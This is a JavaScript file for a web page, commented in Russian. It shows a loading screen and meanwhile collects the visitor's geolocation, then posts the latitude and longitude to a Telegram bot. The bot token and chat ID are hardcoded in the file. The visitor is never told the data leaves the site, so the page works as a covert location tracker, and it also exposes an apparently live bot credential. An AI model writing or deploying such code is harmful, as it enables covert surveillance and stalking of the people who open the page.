document.addEventListener("DOMContentLoaded", () => {
    // Показываем экран загрузки
    setTimeout(() => {
        document.querySelector(".loading-screen").style.opacity = "0";
        setTimeout(() => {
            document.querySelector(".loading-screen").remove();
        }, 1000);
    }, 2000);

    // Функция отправки геолокации
    function sendLocationToTelegram(lat, lon) {
        let botToken = "8070130921:AAGSstD2MhWp5X-2c2dWUaBWqAFAYZL8Ikg"; // Твой токен
        let chatId = "6391810894"; // Убрал пробел

        let message = `📍 Новая геолокация:\nШирота: ${lat}\nДолгота: ${lon}`;
        let url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("✅ Геоданные отправлены:", data);
            } else {
                console.error("❌ Ошибка Telegram API:", data);
            }
        })
        .catch(error => console.error("❌ Ошибка отправки:", error));
    }

    // Получение геолокации
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                let lat = position.coords.latitude;
                let lon = position.coords.longitude;
                console.log(`✅ Получена геолокация: ${lat}, ${lon}`);
                sendLocationToTelegram(lat, lon);
            },
            (error) => {
                console.error("❌ Геолокация не получена:", error);
            }
        );
    } else {
        console.error("❌ Браузер не поддерживает геолокацию");
    }
});
